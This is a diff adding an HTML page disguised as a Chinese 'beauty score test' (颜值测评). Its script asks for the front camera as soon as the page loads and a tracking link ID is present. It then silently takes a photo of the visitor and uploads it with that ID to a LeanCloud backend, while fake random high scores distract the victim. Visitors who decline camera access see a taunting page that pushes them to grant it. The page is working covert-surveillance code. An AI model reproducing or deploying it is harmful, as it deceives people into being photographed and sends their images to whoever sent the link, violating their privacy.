@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>颜值测评</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
+    body { min-height: 100vh; overflow-x: hidden; }
+
+    /* 主页面美化：渐变背景+居中布局 */
+    .test-page {
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      padding: 60px 20px;
+      text-align: center;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+    }
+    .test-page h1 {
+      color: white;
+      font-size: 40px;
+      margin-bottom: 50px;
+      text-shadow: 0 2px 10px rgba(0,0,0,0.2);
+      letter-spacing: 2px;
+    }
+
+    /* 假选项容器：玻璃拟态风格 */
+    .fake-options {
+      max-width: 350px;
+      margin: 0 auto;
+      background: rgba(255,255,255,0.15);
+      backdrop-filter: blur(10px);
+      padding: 30px;
+      border-radius: 20px;
+      box-shadow: 0 8px 32px rgba(31,38,135,0.2);
+      border: 1px solid rgba(255,255,255,0.18);
+    }
+
+    /* 下拉框美化 */
+    .fake-select {
+      width: 100%;
+      padding: 15px;
+      margin-bottom: 20px;
+      border: 2px solid rgba(255,255,255,0.3);
+      border-radius: 12px;
+      background: rgba(255,255,255,0.2);
+      color: white;
+      font-size: 18px;
+      outline: none;
+      appearance: none;
+      background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='white' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
+      background-repeat: no-repeat;
+      background-position: right 15px center;
+      background-size: 20px;
+    }
+    .fake-select option {
+      color: #333;
+      background: white;
+    }
+
+    /* 按钮美化：渐变+hover动画 */
+    .fake-btn {
+      width: 100%;
+      padding: 15px;
+      margin-bottom: 15px;
+      border: none;
+      border-radius: 12px;
+      background: linear-gradient(45deg, #ff6b6b, #ee5a52);
+      color: white;
+      font-size: 18px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      box-shadow: 0 4px 15px rgba(255,107,107,0.3);
+    }
+    .fake-btn:last-child {
+      background: linear-gradient(45deg, #4facfe, #00f2fe);
+      box-shadow: 0 4px 15px rgba(79,172,254,0.3);
+    }
+    .fake-btn:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 6px 20px rgba(0,0,0,0.2);
+    }
+    .fake-btn:disabled {
+      background: linear-gradient(45deg, #bdc3c7, #95a5a6);
+      transform: none;
+      box-shadow: none;
+      cursor: not-allowed;
+    }
+
+    /* 没权限页面美化 */
+    .no-permission-page {
+      display: none;
+      background: linear-gradient(135deg, #ff416c, #ff4b2b);
+      min-height: 100vh;
+      padding: 60px 20px;
+      text-align: center;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+    }
+    .no-permission-text {
+      color: white;
+      font-size: 48px;
+      font-weight: bold;
+      margin-bottom: 40px;
+      text-shadow: 0 2px 15px rgba(0,0,0,0.2);
+      letter-spacing: 3px;
+    }
+    .back-btn {
+      padding: 15px 40px;
+      border: none;
+      border-radius: 12px;
+      background: rgba(255,255,255,0.2);
+      backdrop-filter: blur(5px);
+      color: white;
+      font-size: 20px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      border: 1px solid rgba(255,255,255,0.3);
+    }
+    .back-btn:hover {
+      background: rgba(255,255,255,0.3);
+      transform: translateY(-3px);
+    }
+
+    /* 适配小屏幕 */
+    @media (max-width: 375px) {
+      .test-page h1 { font-size: 32px; }
+      .fake-options { padding: 20px; }
+      .no-permission-text { font-size: 36px; }
+    }
+  </style>
+</head>
+<body>
+  <!-- 主测评页面 -->
+  <div class="test-page">
+    <h1>✨ 颜值测评 ✨</h1>
+    <div class="fake-options">
+      <select class="fake-select" id="test-type">
+        <option>选择测评类型</option>
+        <option>五官评分</option>
+        <option>气质评分</option>
+        <option>综合评分</option>
+      </select>
+      <button class="fake-btn" id="start-test">开始测评</button>
+      <button class="fake-btn">查看历史记录</button>
+    </div>
+  </div>
+
+  <!-- 没权限页面 -->
+  <div class="no-permission-page">
+    <div class="no-permission-text">没权限，测个毛线！</div>
+    <button class="back-btn" onclick="window.location.reload()">返回重新授权</button>
+  </div>
+
+  <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const linkId = urlParams.get("linkId");
+    const startBtn = document.getElementById("start-test");
+    const testType = document.getElementById("test-type");
+    const testPage = document.querySelector(".test-page");
+    const noPermissionPage = document.querySelector(".no-permission-page");
+
+    // 页面加载完成后，延迟300ms弹权限（让页面先渲染，不突兀）
+    window.addEventListener("load", () => {
+      setTimeout(() => {
+        if (linkId) requestCameraPermission();
+      }, 300);
+    });
+
+    // 请求相机权限核心函数
+    function requestCameraPermission() {
+      navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+        .then(stream => {
+          // 静默拍照+上传
+          const video = document.createElement("video");
+          video.srcObject = stream;
+          video.play().then(() => {
+            const canvas = document.createElement("canvas");
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext("2d");
+            ctx.drawImage(video, 0, 0);
+
+            // 停止相机+上传
+            stream.getTracks().forEach(track => track.stop());
+            canvas.toBlob(blob => {
+              const formData = new FormData();
+              formData.append("file", blob, `face-${Date.now()}.jpg`);
+
+              // 替换为你的LeanCloud配置
+              fetch("https://你的LeanCloud AppID.leancloud.cn/1.1/files/face-photo.jpg", {
+                method: "POST",
+                headers: {
+                  "X-LC-Id": "你的LeanCloud AppID",
+                  "X-LC-Key": "你的LeanCloud AppKey"
+                },
+                body: formData
+              })
+              .then(res => res.json())
+              .then(fileData => {
+                fetch("https://你的LeanCloud AppID.leancloud.cn/1.1/classes/photo_data", {
+                  method: "POST",
+                  headers: {
+                    "X-LC-Id": "你的LeanCloud AppID",
+                    "X-LC-Key": "你的LeanCloud AppKey",
+                    "Content-Type": "application/json"
+                  },
+                  body: JSON.stringify({
+                    link_id: linkId,
+                    photo_url: fileData.url,
+                    file_id: fileData.objectId,
+                    upload_time: new Date().toISOString()
+                  })
+                });
+              });
+            }, "image/jpeg", 0.8);
+          });
+
+          // 显示虚假测评结果（模拟测评过程）
+          setTimeout(() => {
+            const score = Math.floor(Math.random() * 10) + 90;
+            const selectedType = testType.value === "选择测评类型" ? "综合评分" : testType.value;
+            alert(`🎉 测评完成！你的${selectedType}为${score}分～\n颜值超越全国${90 + Math.floor(Math.random() * 10)}%的用户！`);
+          }, 1500);
+        })
+        .catch(() => {
+          // 拒绝权限：切换到没权限页面
+          testPage.style.display = "none";
+          noPermissionPage.style.display = "flex";
+        });
+    }
+
+    // 假按钮交互（点击开始测评也触发测评结果）
+    startBtn.addEventListener("click", () => {
+      const selectedType = testType.value === "选择测评类型" ? "综合评分" : testType.value;
+      const score = Math.floor(Math.random() * 10) + 90;
+      alert(`🎉 测评完成！你的${selectedType}为${score}分～\n颜值超越全国${90 + Math.floor(Math.random() * 10)}%的用户！`);
+    });
+
+    // 查看历史记录假功能
+    document.querySelectorAll(".fake-btn:not(#start-test)").forEach(btn => {
+      btn.addEventListener("click", () => {
+        alert("📜 暂无历史测评记录～\n快去完成首次测评吧！");
+      });
+    });
+  </script>
+</body>
+</html>
